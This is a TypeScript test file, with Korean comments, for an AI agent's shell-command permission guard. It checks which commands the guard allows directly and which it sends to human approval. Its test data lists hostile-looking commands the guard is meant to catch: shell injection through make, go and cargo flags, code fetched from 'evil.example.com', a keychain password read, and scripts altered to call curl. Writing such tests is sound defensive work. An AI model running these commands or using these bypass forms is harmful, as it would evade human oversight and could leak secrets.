// 안전 빈틈 막기 시험 (2026-11-15 사용자 결정: H1-A·H2-B·H3-A·H4-A·S5-A)
// 실행: npm test (실제 명령은 실행하지 않고 판단만 본다)
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import type { CanUseTool } from '@anthropic-ai/claude-agent-sdk';
import type { MissionConfig, RanoConfig } from '../../shared/types.js';
import { commandOf } from '../approvals/approvalSafety.js';
import { classifyBash, gitRemotesAt, syncGitArgs, type BashContext } from './bashRules.js';
import {
  appLogRoots,
  decideApprovalStage,
  fileFingerprint,
  grantFilesFor,
  grantInfoFor,
  LeaderGuard,
  OTHER_TASK_TITLE,
  RELATED_MAX_FILES,
  relatedFilesFor,
  trustedRunProblem,
} from './leaderPermissions.js';
import { missionTmpDir } from './missionTmp.js';

const ROOT = realpathSync(mkdtempSync(path.join(tmpdir(), 'rano-gaps-')));
const TARGET = path.join(ROOT, 'repo');
const OUTSIDE = path.join(ROOT, 'outside');
const HOME = path.join(ROOT, 'home');
for (const d of [path.join(TARGET, 'src'), path.join(TARGET, 'scripts', 'sub'), path.join(TARGET, 'node_modules', '.bin'), OUTSIDE, HOME]) mkdirSync(d, { recursive: true });
writeFileSync(path.join(TARGET, 'src', 'a.ts'), 'x');
writeFileSync(path.join(TARGET, 'package.json'), '{"scripts":{"build":"tsc"}}');
writeFileSync(path.join(TARGET, 'node_modules', '.bin', 'tsx'), '');
writeFileSync(path.join(TARGET, 'scripts', 'run.mjs'), 'import "./helper.mjs";\n');
writeFileSync(path.join(TARGET, 'scripts', 'helper.mjs'), 'console.log(1)\n');
writeFileSync(path.join(TARGET, 'scripts', 'sub', 'util.js'), 'module.exports = 1\n');
writeFileSync(path.join(TARGET, 'scripts', 'notes.txt'), '메모');
writeFileSync(path.join(TARGET, 'scripts', 'x.sh'), 'echo hi\n');
writeFileSync(path.join(TARGET, 'scripts', 'tool.py'), 'print(1)\n');
// 경로를 붙여 부르는 해석기(리포 안 가상 환경)
mkdirSync(path.join(TARGET, '.venv', 'bin'), { recursive: true });
writeFileSync(path.join(TARGET, '.venv', 'bin', 'python'), '');
// 등록된 원격: origin·upstream (검수 지적 H2)
mkdirSync(path.join(TARGET, '.git'), { recursive: true });
writeFileSync(path.join(TARGET, '.git', 'config'), '[core]\n\tbare = false\n[remote "origin"]\n\turl = https://example.com/a.git\n[remote "upstream"]\n\turl = https://example.com/b.git\n');
symlinkSync(OUTSIDE, path.join(TARGET, 'link-out'));

const base: MissionConfig = {
  id: 'm1',
  name: '시험',
  zone: 'personal',
  home: HOME,
  targets: [TARGET],
  readonlyRefs: [],
  rulesFiles: [],
  rolesDir: path.join(HOME, 'roles'),
  roleDirs: [],
  roles: ['w'],
  reviewerRoles: [],
  stagePolicy: 'approval',
  directWriteDirs: [],
};
const trusted: MissionConfig = { ...base, trustRepo: true };
const runsDir = path.join(ROOT, 'rano', 'runs');
const config: RanoConfig = {
  rootDir: path.join(ROOT, 'rano'),
  authMethod: 'max',
  models: { rano: 'x', repoLeader: 'x', member: 'x' },
  blocked: ['**/.env'],
  memoryDir: path.join(ROOT, 'rano', 'memory'),
  memoryFiles: [],
  autoCommit: false,
  runsDir,
  missions: [trusted],
  raw: {},
};
const TMP = missionTmpDir(config, 'm1');
mkdirSync(TMP, { recursive: true });
writeFileSync(path.join(TMP, 'x.mjs'), 'console.log(1)\n');

const actor = { isSubagent: false, teamApproved: true, trustRepo: true };
const stage = (m: MissionConfig, command: string) => decideApprovalStage(config, m, 'Bash', { command }, TARGET, actor);
const sh = (command: string) => ({ command });

async function judge(g: LeaderGuard, tool: string, input: Record<string, unknown>): Promise<'allow' | 'ask' | 'deny'> {
  const r = await (g.canUseTool as CanUseTool)(tool, input, { signal: new AbortController().signal, suggestions: [], toolUseID: 'x' } as never);
  if (!r || r.behavior === 'allow') return 'allow';
  return 'message' in r && String(r.message).includes('승인함이 연결되지 않아') ? 'ask' : 'deny';
}
async function hook(g: LeaderGuard, command: string, cwd = TARGET): Promise<string> {
  const h = g.hooks().PreToolUse![0].hooks[0];
  const out = (await h(
    { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd, session_id: 's', transcript_path: '' } as never,
    'x',
    { signal: new AbortController().signal },
  )) as { hookSpecificOutput?: { permissionDecision?: string } };
  return out.hookSpecificOutput?.permissionDecision ?? 'none';
}

// ---------------- H1-A ----------------
test('H1-A 믿는 미션: 폴더 안 스크립트 실행·시험·아는 명령은 그대로 바로', () => {
  for (const c of [
    'node scripts/run.mjs',
    'npm run build',
    'npm run lint:fix',
    'yarn build',
    'pnpm test',
    'make build',
    'bash scripts/x.sh',
    './scripts/x.sh',
    'npx tsx src/a.ts',
    'tsx scripts/run.mjs',
    'timeout 60 npm run build',
    `node ${path.join(TMP, 'x.mjs')}`,
    'python3 -m pytest',
    'python3 scripts/tool.py',
    'go test ./...',
    'cargo build',
    'node --test',
    'set -e; npm run build',
  ])
    assert.equal(stage(trusted, c).type, 'allow', c);
});

test('H1-A 믿는 미션: 모르는 프로그램·글로 넘긴 코드·설치는 승인함', () => {
  for (const c of [
    // ① 앱이 모르는 프로그램
    'security find-generic-password -s x',
    'defaults write com.x y 1',
    'crontab -l',
    'docker run x',
    'open https://example.com',
    // ② 명령 글에 코드를 넣어 돌리기
    `node -e "require('fs')"`,
    'node -p 1',
    'python3 -c "print(1)"',
    'sh -c "ls"',
    'bash -lc "ls"',
    'osascript -e "beep"',
    'cat src/a.ts | sh',
    'cat src/a.ts | python3 -',
    'eval "ls"',
    'deno eval "1"',
    'bun -e 1',
    `awk 'BEGIN { system("ls") }'`,
    "sed -i '' '1e date' src/a.ts",
    'find . -name x -exec node {} ;',
    'ls | xargs node',
    'cat > src/b.txt <<EOF\n$(date)\nEOF',
    // ③ 설치·받기
    'npm install left-pad',
    'npm i',
    'npm ci',
    'yarn',
    'yarn add x',
    'pnpm add x',
    'npx cowsay hi',
    'npx -y tsx src/a.ts',
    'npm exec cowsay',
    'pip install x',
    'python3 -m pip install x',
    'brew install x',
    'cargo install ripgrep',
    'go install example.com/x@latest',
    // 폴더 밖 스크립트·경로
    `node ${OUTSIDE}/x.js`,
    `${OUTSIDE}/run.sh`,
    `node scripts/run.mjs ${OUTSIDE}/data.txt`,
    'node link-out/x.js',
    'npm --prefix ../outside run build',
  ]) {
    const d = stage(trusted, c);
    assert.equal(d.type, 'ask', c);
    assert.match(d.ask?.detail ?? '', /믿는 미션이지만 묻는 이유/, c);
  }
});

test('H1-A 보통 미션은 그대로(모두 승인함), 이유 줄도 없음', () => {
  for (const c of ['node scripts/run.mjs', 'node -e 1', 'security x']) {
    const d = stage(base, c);
    assert.equal(d.type, 'ask', c);
    assert.doesNotMatch(d.ask?.detail ?? '', /믿는 미션이지만/, c);
  }
});

test('H1-A 실행 판단 함수: 쉬운 말 이유', () => {
  const roots = [TARGET];
  const run = (word: string, args: string[]) => trustedRunProblem({ name: path.basename(word), word, args, cwd: TARGET }, roots);
  assert.equal(run('node', ['scripts/run.mjs']), null);
  assert.match(run('node', ['-e', '1']) ?? '', /코드를 넣어/);
  assert.match(run('security', ['x']) ?? '', /모르는 프로그램/);
  assert.match(run('npx', ['cowsay']) ?? '', /설치되지 않은/);
  assert.match(run('npm', ['install']) ?? '', /npm install/);
  assert.match(run('node', []) ?? '', /입력으로 받은 코드/);
});

// ---------------- 검수 지적 (2026-11-15 재검수 전 수정) ----------------
test('검수 H1: 묶음 옵션·경로 붙인 해석기·없는 스크립트·코드 주소·yarn node·make --eval 은 승인함', () => {
  for (const c of [
    // 짧은 옵션 묶음 안의 코드 글자
    'python3 -Bc "print(1)"',
    'python3 -Ic "print(1)"',
    'python3 -IBc "print(1)"',
    'python3 -Bm http.server',
    'ruby -we "puts 1"',
    'ruby -S evil',
    'perl -S evil',
    'bash -ec "ls"',
    'node -pe 1',
    // 스크립트 자리 낱말이 실제 파일이 아님
    'python3 notexist',
    'python3 scripts/none.py',
    'bash notexist.sh',
    'node nofile.js',
    'source nofile.sh',
    // data: · file: · 인터넷 주소
    "node --test --import 'data:text/javascript,1'",
    'node --test --import=data:text/javascript,1',
    'node --import file:///x.mjs scripts/run.mjs',
    'node -r data:text/javascript,1 scripts/run.mjs',
    'node scripts/run.mjs data:text/javascript,1',
    'node scripts/run.mjs https://evil.example.com/x.js',
    'php -d auto_prepend_file=data://text/plain,x scripts/x.php',
    // 경로를 붙여 부른 해석기
    'node_modules/.bin/tsx -e 1',
    './node_modules/.bin/tsx -e 1',
    '.venv/bin/python -c 1',
    '.venv/bin/python -Bc 1',
    // 패키지 관리자로 부른 해석기·도구
    'yarn node -e 1',
    'pnpm node -e 1',
    'yarn tsx -e 1',
    'yarn run tsx -e 1',
    // make 에 규칙 글 넣기
    "make --eval 'x:'",
    'make --eval=x',
    'make -E x',
  ]) {
    const d = stage(trusted, c);
    assert.equal(d.type, 'ask', c);
    assert.match(d.ask?.detail ?? '', /믿는 미션이지만 묻는 이유/, c);
  }
});

test('검수 H1(중간): 버전 붙은 패키지·원격 모듈 받아 실행은 승인함', () => {
  for (const c of ['npx tsx@4 src/a.ts', 'npx tsx@latest src/a.ts', 'npx @scope/x@1', 'bunx tsx@4', 'npm exec tsx@4', 'pnpm exec tsx@4', 'pnpm dlx tsx', 'yarn dlx tsx', 'go run example.com/x@latest', 'go run golang.org/x/tools/cmd/stringer@v0.1.0']) {
    const d = stage(trusted, c);
    assert.equal(d.type, 'ask', c);
    assert.match(d.ask?.detail ?? '', /믿는 미션이지만 묻는 이유/, c);
  }
});

test('검수 H1: 지금까지 바로 되던 꼴은 그대로 바로(실제 스크립트 파일·npm run·설치된 npx 도구 버전 없이)', () => {
  for (const c of [
    'node scripts/run.mjs',
    'python3 scripts/tool.py',
    'python3 -B scripts/tool.py',
    'python3 -Bm pytest',
    'bash -eo pipefail scripts/x.sh',
    'bash -x scripts/x.sh',
    'node_modules/.bin/tsx scripts/run.mjs',
    '.venv/bin/python scripts/tool.py',
    'yarn tsx scripts/run.mjs',
    'pnpm tsx src/a.ts',
    'npm run build',
    'npx tsx src/a.ts',
    'node --test',
    'node --import tsx scripts/run.mjs',
    'node scripts/run.mjs http://localhost:3000/x',
    'go run ./cmd/x',
    'make build',
    'nohup npm run build',
    // 읽기만 하는 아는 명령 (검수 지적 6)
    'command -v node',
    'command -V tsc',
    'ps aux',
    'ps -p 123 -o pid,etime,command',
  ])
    assert.equal(stage(trusted, c).type, 'allow', c);
});

test('검수 H1(남은 우회): make 설정값 덮어쓰기·go -exec·-toolexec 는 승인함', () => {
  for (const c of [
    "make CC='sh -c id'",
    'make SHELL=bash',
    'make build SHELL=/bin/sh',
    'gmake CC=x test',
    'make -j4 CFLAGS=-O2',
    'timeout 60 make SHELL=bash',
    'go test -exec /bin/sh ./...',
    'go test -exec=sh ./...',
    'go test --exec=sh ./...',
    'go run -exec sh ./cmd/x',
    'go build -toolexec /bin/sh ./...',
    'go build -toolexec=sh ./...',
    'go vet -toolexec=sh ./...',
    'go vet -vettool=/bin/sh ./...',
    'go vet -vettool /bin/sh ./...',
  ]) {
    const d = stage(trusted, c);
    assert.equal(d.type, 'ask', c);
    assert.match(d.ask?.detail ?? '', /믿는 미션이지만 묻는 이유/, c);
  }
  for (const c of ['make', 'make test', 'make -j4 build', 'go test ./...', 'go test -run TestX ./...', 'go build ./...', 'go vet ./...']) assert.equal(stage(trusted, c).type, 'allow', c);
});

test('재검수 남은 꼴: go env -w·make -f -·cmake -E/-D·cargo --config·nx exec 는 승인함', () => {
  for (const c of [
    'go env -w GOFLAGS=-toolexec=sh',
    'go env -u GOFLAGS',
    'go clean -modcache',
    'make -f -',
    'make --file=-',
    'make -sf -',
    "cmake -E env sh -c 'id'",
    'cmake -DCMAKE_C_COMPILER=/bin/sh .',
    "cargo test --config 'target.x.runner=\"sh -c id\"'",
    'nx exec -- sh',
  ]) {
    const d = stage(trusted, c);
    assert.equal(d.type, 'ask', c);
    assert.match(d.ask?.detail ?? '', /믿는 미션이지만 묻는 이유/, c);
  }
  for (const c of ['go env GOPATH', 'go clean', 'cmake --build build', 'cargo test', 'cargo build --release', 'nx build app']) assert.equal(stage(trusted, c).type, 'allow', c);
});

test('검수 6: ps 는 환경 변수까지 보이는 옵션만, export·nice·env 는 그대로 승인함', () => {
  // 맥 ps -e 는 모든 프로세스(-A)라 바로
  for (const c of ['ps -ef', 'ps -A']) assert.equal(stage(trusted, c).type, 'allow', c);
  for (const c of ['ps eww', 'ps -E', 'export X=1', 'nice npm test', 'env X=1 npm test', 'env NODE_OPTIONS=--require=./x.js npm test', 'nohup NODE_OPTIONS=x npm run build', 'command -p ls -la /']) assert.equal(stage(trusted, c).type, 'ask', c);
  // 보통 미션은 command -v·ps 도 그대로 승인함(판단은 바뀌지 않음)
  for (const c of ['command -v node', 'ps aux']) assert.equal(stage(base, c).type, 'ask', c);
});

// ---------------- H2-B ----------------
const ctx: BashContext = { cwd: TARGET, targets: [TARGET], readRoots: [TARGET], isBlocked: () => false };
test('H2-B 받아오기는 허용 옵션·원격 이름·가지 이름만', () => {
  for (const c of [
    'git pull --ff-only',
    'git pull --ff-only origin main',
    'git pull --ff-only -q --prune origin feature/x',
    'git pull --ff-only --no-rebase upstream develop',
    'git merge --ff-only origin/develop',
    'git merge --ff-only @{u}',
    'git fetch origin',
    'git fetch --prune --tags origin',
    'git fetch --all',
    'git fetch -q origin develop',
  ])
    assert.equal(classifyBash(c, ctx).syncOnly, true, c);
  for (const c of [
    'git pull --ff-only --upload-pack=x',
    'git pull --ff-only --upload-pack x origin',
    'git pull --ff-only --exec=x origin',
    'git pull --ff-only ../other',
    'git pull --ff-only /tmp/evil',
    'git pull --ff-only https://evil.example.com/x.git',
    'git pull --ff-only git@github.com:x/y.git',
    'git pull --ff-only origin +main',
    'git pull --ff-only origin main:main',
    'git pull --ff-only origin ../x',
    'git pull --ff-only --rebase',
    'git pull --ff-only -s ours origin',
    'git merge --ff-only a b',
    'git merge --ff-only --no-verify origin/main',
    'git fetch --upload-pack=x origin',
    'git fetch -u x origin',
    'git fetch ../x',
    'git fetch origin +refs/heads/*:refs/x/*',
    'git fetch origin main:main',
  ])
    assert.notEqual(classifyBash(c, ctx).syncOnly, true, c);
  assert.equal(syncGitArgs('pull', ['--ff-only', 'origin']), true);
  assert.equal(syncGitArgs('pull', ['origin']), false); // --ff-only 없으면 아님
});

test('검수 H2: 원격 이름은 .git/config 에 등록된 것만, 읽을 수 없으면 origin 만', () => {
  assert.deepEqual(gitRemotesAt(TARGET), ['origin', 'upstream']);
  assert.deepEqual(gitRemotesAt(path.join(TARGET, 'src')), ['origin', 'upstream']); // 아래 폴더에서도 위로 찾음
  assert.deepEqual(gitRemotesAt(OUTSIDE), ['origin']); // git 폴더가 아님
  // worktree: .git 파일이 가리키는 곳의 commondir 의 config
  const wt = path.join(ROOT, 'wt');
  const wtGit = path.join(TARGET, '.git', 'worktrees', 'wt');
  mkdirSync(wt, { recursive: true });
  mkdirSync(wtGit, { recursive: true });
  writeFileSync(path.join(wt, '.git'), `gitdir: ${wtGit}\n`);
  writeFileSync(path.join(wtGit, 'commondir'), '../..\n');
  assert.deepEqual(gitRemotesAt(wt), ['origin', 'upstream']);
  for (const c of ['git pull --ff-only upstream develop', 'git fetch upstream', 'git fetch origin main']) assert.equal(classifyBash(c, ctx).syncOnly, true, c);
  for (const c of ['git pull --ff-only evil main', 'git fetch evil', 'git fetch --prune evil', 'git pull --ff-only other']) assert.notEqual(classifyBash(c, ctx).syncOnly, true, c);
  // 원격 목록을 모르면 origin 만
  const bare: BashContext = { ...ctx, cwd: OUTSIDE, targets: [OUTSIDE], readRoots: [OUTSIDE] };
  assert.equal(classifyBash('git fetch origin', bare).syncOnly, true);
  assert.notEqual(classifyBash('git fetch upstream', bare).syncOnly, true);
  assert.equal(syncGitArgs('fetch', ['upstream']), false);
  assert.equal(syncGitArgs('fetch', ['upstream'], ['origin', 'upstream']), true);
});

test('검수 H2: 받아오기 지시(preSync)가 있어도 등록 안 된 원격 이름이면 승인함', async () => {
  const g = new LeaderGuard({ config, mission: base, log: () => {} });
  g.setTask({ id: 'p2', title: 'pull', preSync: true });
  assert.equal(await judge(g, 'Bash', sh('git pull --ff-only upstream develop')), 'allow');
  for (const c of ['git pull --ff-only evil main', 'git fetch evil']) assert.equal(await judge(g, 'Bash', sh(c)), 'ask', c);
});

test('H2-B 받아오기 지시(preSync)가 있어도 모르는 옵션이 섞이면 승인함', async () => {
  const g = new LeaderGuard({ config, mission: base, log: () => {} });
  g.setTask({ id: 'p1', title: 'pull', preSync: true });
  assert.equal(await judge(g, 'Bash', sh('git pull --ff-only origin main')), 'allow');
  for (const c of ['git pull --ff-only --upload-pack=touch origin', 'git pull --ff-only ../other', 'git fetch --upload-pack=x'])
    assert.equal(await judge(g, 'Bash', sh(c)), 'ask', c);
});

// ---------------- H3-A ----------------
test('H3-A 실행 목록 지문: 옆 파일·폴더 목록·package.json 까지 묶음', () => {
  const cmd = 'node scripts/run.mjs';
  const rel = relatedFilesFor(cmd, TARGET);
  assert.ok(rel.includes(path.join(TARGET, 'scripts', 'helper.mjs')));
  assert.ok(rel.includes(path.join(TARGET, 'scripts', 'sub', 'util.js')));
  assert.ok(rel.includes(path.join(TARGET, 'scripts') + path.sep)); // 폴더 목록
  assert.ok(rel.includes(path.join(TARGET, 'package.json')));
  assert.ok(!rel.includes(path.join(TARGET, 'scripts', 'notes.txt'))); // 스크립트·설정 파일만
  assert.ok(!rel.includes(path.join(TARGET, 'scripts', 'run.mjs'))); // 명령에 적힌 스크립트는 따로
  const files = grantFilesFor(cmd, TARGET);
  assert.equal(files.filter((f) => !f.related).length, 1);
});

test('H3-A 옆 파일이 바뀌거나 새 파일이 생기면 실행 목록 승인으로 넘어가지 않음', async () => {
  const g = new LeaderGuard({ config, mission: base, log: () => {} });
  g.setTask({ id: 't1', title: '시험' });
  g.markTeamApproved('t1');
  const cmd = 'node scripts/run.mjs';
  g.grantCommands('t1', [{ command: cmd, cwd: TARGET, files: grantFilesFor(cmd, TARGET) }]);
  assert.equal(await hook(g, cmd), 'allow');
  const helper = path.join(TARGET, 'scripts', 'helper.mjs');
  writeFileSync(helper, 'require("child_process").execSync("curl x")\n');
  assert.equal(await hook(g, cmd), 'ask'); // 옆 모듈이 바뀜
  writeFileSync(helper, 'console.log(1)\n');
  assert.equal(await hook(g, cmd), 'allow');
  const added = path.join(TARGET, 'scripts', 'evil.mjs');
  writeFileSync(added, 'x');
  assert.equal(await hook(g, cmd), 'ask'); // 새 파일
  rmSync(added);
  assert.equal(await hook(g, cmd), 'allow');
  writeFileSync(path.join(TARGET, 'scripts', 'notes.txt'), '결과 메모'); // 스크립트·설정이 아닌 파일은 그대로
  assert.equal(await hook(g, cmd), 'allow');
  const pkg = path.join(TARGET, 'package.json');
  writeFileSync(pkg, '{"scripts":{"build":"tsc && curl x"}}');
  assert.equal(await hook(g, cmd), 'ask'); // package.json 이 바뀜
  writeFileSync(pkg, '{"scripts":{"build":"tsc"}}');
  assert.equal(await hook(g, cmd), 'allow');
});

test('H3-A 상한: 파일이 많아도 200개까지만, 맨 위 폴더는 훑지 않음', () => {
  const many = path.join(ROOT, 'many', 'deep', 'dir');
  mkdirSync(many, { recursive: true });
  for (let i = 0; i < 260; i++) writeFileSync(path.join(many, `f${String(i).padStart(3, '0')}.js`), 'x');
  const rel = relatedFilesFor(`node ${path.join(many, 'f000.js')}`, many);
  assert.ok(rel.filter((p) => p.endsWith('.js')).length <= RELATED_MAX_FILES);
  // '/' 바로 아래는 훑지 않음: 폴더 목록·옆 파일 없이 node 명령의 package.json 하나만
  assert.deepEqual(relatedFilesFor('node /x.js', '/'), ['/package.json']);
});

test('검수 H3: 상한을 넘어도 폴더 이름 목록은 전부 보고, 내용을 못 묶은 수를 알려 줌', () => {
  const many = path.join(ROOT, 'many2', 'deep', 'dir');
  mkdirSync(many, { recursive: true });
  for (let i = 0; i < 260; i++) writeFileSync(path.join(many, `f${String(i).padStart(3, '0')}.js`), 'x');
  const cmd = `node ${path.join(many, 'f000.js')}`;
  const info = grantInfoFor(cmd, many);
  assert.equal(info.unbound, 260 - RELATED_MAX_FILES); // f200~f259 는 이름만
  assert.ok(info.files.filter((f) => f.related && f.path.endsWith('.js')).length <= RELATED_MAX_FILES);
  const dirMark = many + path.sep; // 폴더 목록 지문 표시(경로 끝 /)
  const before = fileFingerprint(dirMark);
  // 이름순으로 200번째 뒤에 오는 새 파일도 폴더 목록 지문을 바꾼다(전에는 상한 뒤라 못 봄)
  const late = path.join(many, 'z-new.js');
  writeFileSync(late, 'x');
  assert.notEqual(fileFingerprint(dirMark), before);
  rmSync(late);
  assert.equal(fileFingerprint(dirMark), before);
  // 상한에 안 걸리면 0
  assert.equal(grantInfoFor('node scripts/run.mjs', TARGET).unbound, 0);
});

test('검수 H3: 실행 목록 카드 글이 사실대로(이름만 본 파일 수 줄·단정 문장 없음)', () => {
  const src = readFileSync(fileURLToPath(new URL('../../../src/main/mission/leaderTools.ts', import.meta.url)), 'utf-8');
  assert.match(src, /개는 내용까지 묶지 못함/);
  assert.match(src, /const \{ files, unbound \} = grantInfoFor\(command, cwd\);/);
  assert.ok(!src.includes('글자·실행 위치·스크립트 내용이 그대로일 때만 다시 묻지 않아요. 하나라도 바뀌면 다시 물어요'));
});

// ---------------- H4-A ----------------
test('H4-A 다른 과제가 진행 중이면 폴더 전체 git 명령은 받아오기 지시·실행 목록이 있어도 경고 카드', async () => {
  let others: { id: string; title: string }[] = [{ id: 'o1', title: '화면 고치기' }];
  const g = new LeaderGuard({ config, mission: base, log: () => {}, others: () => others });
  g.setTask({ id: 'p1', title: 'pull', preSync: true });
  for (const c of ['git stash push -u -m pre-pull', 'git pull --ff-only', 'git merge --ff-only origin/develop', 'git stash pop']) {
    assert.equal(await judge(g, 'Bash', sh(c)), 'ask', c);
    const d = g.previewCommand(c, TARGET, false);
    assert.match(d.ask?.title ?? '', new RegExp(`^${OTHER_TASK_TITLE}: `), c);
    assert.match(d.ask?.detail ?? '', /「화면 고치기」/, c);
    // 검수 지적 H4: 경고는 자세히 글 끝. 맨 앞 "명령: …" 줄을 읽는 곳(승인함 앞면·대화 지금 줄·휴대폰 글)이 명령을 그대로 읽는다
    assert.ok((d.ask?.detail ?? '').startsWith('명령: '), c);
    assert.equal(commandOf(d.ask?.detail), c);
    assert.match(d.ask?.detail ?? '', /\n\n주의: 같은 작업 폴더에서 다른 과제/, c);
  }
  // 작업 파일을 바꾸지 않는 받아오기(fetch)는 그대로
  assert.equal(await judge(g, 'Bash', sh('git fetch origin')), 'allow');
  // 보통 커밋 카드에도 경고 제목
  assert.match(g.previewCommand('git checkout main', TARGET, false).ask?.title ?? '', /^다른 과제 진행 중: /);
  // 실행 목록 승인도 넘어가지 않음
  g.grantCommands('p1', [{ command: 'git stash', cwd: TARGET, files: [] }]);
  assert.equal(await hook(g, 'git stash'), 'ask');
  // 다른 과제가 끝나면 지시·목록대로 바로
  others = [];
  assert.equal(await judge(g, 'Bash', sh('git pull --ff-only')), 'allow');
  assert.equal(await hook(g, 'git stash'), 'allow');
  // 자기 과제는 다른 과제로 세지 않음
  others = [{ id: 'p1', title: 'pull' }];
  assert.equal(await judge(g, 'Bash', sh('git stash pop')), 'allow');
});

// ---------------- S5-A ----------------
test('S5-A 읽기만 과제: 정한 앱 기록 파일만 바로 읽기, 비밀·대화 기록·다른 미션은 그대로', async () => {
  for (const [f, body] of [
    ['permissions.jsonl', '{}'],
    ['approvals.json', '[]'],
    ['usage.jsonl', '{}'],
    ['events.jsonl', '{}'],
    ['missions/m1/outputs.json', '[]'],
    ['missions/m1/conversation.json', '[]'],
    ['missions/m2/outputs.json', '[]'],
    ['secrets/x.bin', 'k'],
  ] as const) {
    mkdirSync(path.dirname(path.join(runsDir, f)), { recursive: true });
    writeFileSync(path.join(runsDir, f), body);
  }
  const g = new LeaderGuard({ config, mission: base, log: () => {} });
  g.setTask({ id: 'r1', title: '앱 기록 점검' });
  g.markReadOnly('r1', true);
  const read = (f: string) => judge(g, 'Read', { file_path: path.join(runsDir, f) });
  for (const f of ['permissions.jsonl', 'approvals.json', 'usage.jsonl', 'events.jsonl', 'missions/m1/outputs.json']) assert.equal(await read(f), 'allow', f);
  for (const f of ['missions/m1/conversation.json', 'missions/m2/outputs.json', 'secrets/x.bin']) assert.equal(await read(f), 'deny', f);
  assert.equal(await judge(g, 'Bash', sh(`tail -5 ${path.join(runsDir, 'permissions.jsonl')}`)), 'allow');
  assert.notEqual(await judge(g, 'Bash', sh(`cat ${path.join(runsDir, 'secrets', 'x.bin')}`)), 'allow');
  assert.notEqual(await judge(g, 'Bash', sh(`grep -r x ${runsDir}`)), 'allow');
  // 읽기만 과제가 아니면 그대로
  const h = new LeaderGuard({ config, mission: base, log: () => {} });
  h.setTask({ id: 'w1', title: '고치기' });
  assert.equal(await judge(h, 'Read', { file_path: path.join(runsDir, 'permissions.jsonl') }), 'deny');
});

test('S5-A 다른 구역 미션이 있으면 앱 전체 기록은 빼고 이 미션 기록만', () => {
  const mixed: RanoConfig = { ...config, missions: [base, { ...base, id: 'w9', zone: 'work' }] };
  const roots = appLogRoots(mixed, base);
  assert.ok(!roots.includes(path.join(runsDir, 'approvals.json')));
  assert.ok(roots.includes(path.join(runsDir, 'missions', 'm1', 'outputs.json')));
  assert.ok(appLogRoots(config, base).includes(path.join(runsDir, 'approvals.json')));
});

test('검수 S5: 보관한 미션도 구역 확인에 넣음(config.missions 에는 없고 rano.json 원본에만 있음)', () => {
  // 켜진 미션은 개인 하나뿐이지만, 보관한 회사 미션이 원본에 있으면 앱 전체 기록은 빼고 이 미션 기록만
  const archived: RanoConfig = { ...config, missions: [base], raw: { missions: [{ id: 'm1', zone: 'personal' }, { id: 'old', zone: 'work', archived: true }] } };
  const roots = appLogRoots(archived, base);
  assert.ok(!roots.includes(path.join(runsDir, 'approvals.json')));
  assert.ok(roots.includes(path.join(runsDir, 'missions', 'm1', 'outputs.json')));
  // 원본의 구역 칸이 없으면 config.ts 처럼 회사(work)로 본다
  assert.ok(!appLogRoots({ ...config, missions: [base], raw: { missions: [{ id: 'x', archived: true }] } }, base).includes(path.join(runsDir, 'approvals.json')));
  // 보관 미션도 같은 구역이면 그대로 앱 전체 기록까지
  assert.ok(appLogRoots({ ...config, missions: [base], raw: { missions: [{ id: 'old', zone: 'personal', archived: true }] } }, base).includes(path.join(runsDir, 'approvals.json')));
});

test('S5-A 읽기만 과제의 거절에 막힌 이유를 붙이고, git tag 목록은 읽기', async () => {
  const lines: { reason: string }[] = [];
  const g = new LeaderGuard({ config, mission: base, log: (l) => lines.push(l) });
  g.setTask({ id: 'r2', title: '조사' });
  g.markReadOnly('r2', true);
  const r = await (g.canUseTool as CanUseTool)('Bash', sh('git commit -m x'), { signal: new AbortController().signal, suggestions: [], toolUseID: 'x' } as never);
  assert.ok(r && r.behavior === 'deny');
  assert.match(String('message' in r ? r.message : ''), /막힌 이유/);
  assert.match(lines.at(-1)?.reason ?? '', /git commit/);
  for (const c of ['git tag', 'git tag -l', "git tag -l 'v*'", 'git tag --list --sort=-v:refname']) assert.equal(classifyBash(c, ctx).decision, 'allow', c);
  for (const c of ['git tag v1', 'git tag -d v1', 'git tag -l -d v1', 'git tag -a v1 -m x']) assert.equal(classifyBash(c, ctx).kind, 'commit', c);
});
